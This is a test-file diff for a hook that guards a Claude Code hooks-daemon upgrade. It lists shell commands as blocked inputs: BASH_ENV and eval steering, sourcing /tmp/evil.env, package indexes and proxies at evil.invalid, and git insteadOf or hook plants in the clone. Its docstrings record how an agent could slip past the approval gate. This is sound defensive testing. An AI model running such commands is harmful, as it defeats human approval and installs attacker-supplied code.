@@ -442,6 +442,144 @@ class TestSteeredRunOnAnUnresolvableScriptFailsClosed:
         assert handler.matches(_bash(command)) is False
 
 
+_LAYER2_RUN = (
+    "bash /c/.claude/hooks-daemon/scripts/upgrade_version.sh /p /c/.claude/hooks-daemon v4.0.0"
+)
+_LAYER1_RUN = "bash scripts/upgrade.sh --project-root ."
+
+
+class TestEverySpellingOfSteeringIsSteering:
+    """Plan 00376 review4 MAJOR 1: the steering check matched `NAME=`,
+    `export NAME` and `declare -x NAME`, and a direct Layer 2 call then ran
+    past the gate with `BASH_ENV` set by another spelling. On a command that
+    runs the upgrade, any non-read mention of a steering name, any export of
+    a name that is not a literal, `set -a`, a `declare`/`typeset`/`local` flag
+    containing `x`, `eval` and sourcing another file all count as steering.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            f"read -r BASH_ENV <<< f; declare -gx BASH_ENV; {_LAYER2_RUN}",
+            f"printf -v BASH_ENV %s f; export -- BASH_ENV; {_LAYER2_RUN}",
+            f"set -a; read -r BASH_ENV <<< f; {_LAYER2_RUN}",
+            f'n=BASH_ENV; export "$n=f"; {_LAYER2_RUN}',
+            f"unset() {{ :; }}; declare -f -x unset; {_LAYER2_RUN}",
+            f"typeset -gx BASH_ENV=f; {_LAYER2_RUN}",
+            f'n=BASH_; n+=ENV; set -a; read -r "$n" <<< f; {_LAYER2_RUN}',
+            f'n=BASH_; n+=ENV; set -o allexport; read -r "$n" <<< f; {_LAYER2_RUN}',
+            f'n=BASH_; n+=ENV; export "$n"; {_LAYER2_RUN}',
+            f'n=BASH_; n+=ENV; declare -x "$n=f"; {_LAYER2_RUN}',
+            f'n=BASH_; n+=ENV; env "$n=f" {_LAYER2_RUN}',
+            f'eval "$x"; {_LAYER2_RUN}',
+            f"source /tmp/evil.env; {_LAYER1_RUN}",
+            f". /tmp/evil.env && {_LAYER1_RUN}",
+        ],
+    )
+    def test_denies_each_spelling(self, handler: UpgradeApprovalGuardHandler, command: str) -> None:
+        hook_input = _bash(command)
+        assert handler.matches(hook_input) is True, command
+        result = handler.handle(hook_input)
+        assert result.reason is not None
+        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            f"export NO_COLOR=1 && {_LAYER1_RUN}",
+            f"set -euo pipefail; {_LAYER1_RUN}",
+            f'echo "$HOME"; ls "$HOME/.cache"; {_LAYER1_RUN}',
+            f"UV_LINK_MODE=copy {_LAYER1_RUN}",
+            'tmp="$(mktemp)" && git -C .claude/hooks-daemon show "v4.0.0:scripts/upgrade.sh"'
+            ' > "$tmp" && bash "$tmp" --project-root "$PWD" v4.0.0',
+            "set -a; source .env; set +a; make test",
+            'eval "$(ssh-agent)"; bash "$script"',
+            "read -r BASH_ENV <<< f; declare -gx BASH_ENV; make test",
+        ],
+    )
+    def test_allows_the_same_shapes_without_the_upgrade_or_steering(
+        self, handler: UpgradeApprovalGuardHandler, command: str
+    ) -> None:
+        assert handler.matches(_bash(command)) is False, command
+
+
+class TestInstallerSteeringVariables:
+    """Plan 00376 review4 m1: the variables Layer 1 forwards to Layer 2 that
+    choose where the build backend and the package index come from, or which
+    baseline the config merge diffs against, are denied on an upgrade command
+    like the others."""
+
+    @pytest.mark.parametrize(
+        "assignment",
+        [
+            "UV_INDEX_URL=https://evil.invalid/simple",
+            "UV_DEFAULT_INDEX=https://evil.invalid/simple",
+            "UV_INDEX=evil=https://evil.invalid/simple",
+            "UV_EXTRA_INDEX_URL=https://evil.invalid/simple",
+            "UV_FIND_LINKS=/tmp/wheels",
+            "UV_CONFIG_FILE=/tmp/uv.toml",
+            "UV_PYTHON=/tmp/python",
+            "SSL_CERT_FILE=/tmp/ca.pem",
+            "REQUESTS_CA_BUNDLE=/tmp/ca.pem",
+            "HTTPS_PROXY=http://evil.invalid:8080",
+            "https_proxy=http://evil.invalid:8080",
+            "HOOKS_DAEMON_OLD_DEFAULT_CONFIG=/tmp/baseline.yaml",
+            "HOOKS_DAEMON_OLD_DEFAULT_SETTINGS=/tmp/settings.json",
+        ],
+    )
+    def test_denies_it_on_an_upgrade(
+        self, handler: UpgradeApprovalGuardHandler, assignment: str
+    ) -> None:
+        hook_input = _bash(f"{assignment} {_LAYER1_RUN}")
+        assert handler.matches(hook_input) is True, assignment
+        result = handler.handle(hook_input)
+        assert result.reason is not None
+        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")
+
+    def test_allows_it_elsewhere(self, handler: UpgradeApprovalGuardHandler) -> None:
+        assert handler.matches(_bash("UV_INDEX_URL=https://mirror/simple uv sync")) is False
+
+
+class TestDaemonCloneGitMetadataWrites:
+    """Plan 00376 review4 MAJOR 3 / review3 m2: an agent appending a
+    `url.insteadOf` or a second origin URL to the clone's own `.git/config`
+    by redirect redirected the next fetch. Layer 1 now refuses a rewritten
+    fetch, and writing into the clone's `.git/` is denied like the other
+    routes that decide what gets installed."""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "printf '[url \"/tmp/evil\"]\\n insteadOf = x\\n' >> .claude/hooks-daemon/.git/config",
+            "cat /tmp/evil.cfg >> /p/.claude/hooks-daemon/.git/config",
+            "cp /tmp/hook .claude/hooks-daemon/.git/hooks/post-checkout",
+            "echo deadbeef > .claude/hooks-daemon/.git/refs/tags/v4.0.0",
+        ],
+    )
+    def test_denies_a_bash_write(self, handler: UpgradeApprovalGuardHandler, command: str) -> None:
+        hook_input = _bash(command)
+        assert handler.matches(hook_input) is True, command
+        result = handler.handle(hook_input)
+        assert result.reason is not None
+        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")
+
+    def test_denies_a_write_tool(self, handler: UpgradeApprovalGuardHandler) -> None:
+        assert handler.matches(_write("/p/.claude/hooks-daemon/.git/config", "[url]")) is True
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "cat .claude/hooks-daemon/.git/config",
+            "echo x > .claude/hooks-daemon/untracked/notes.txt",
+            "echo x > .git/config.bak",
+        ],
+    )
+    def test_allows_reads_and_other_paths(
+        self, handler: UpgradeApprovalGuardHandler, command: str
+    ) -> None:
+        assert handler.matches(_bash(command)) is False, command
+
+
 class TestManualCheckoutOfTheDaemonClone:
     """Fresh review MAJOR 1: moving the daemon clone by hand IS an upgrade."""
 
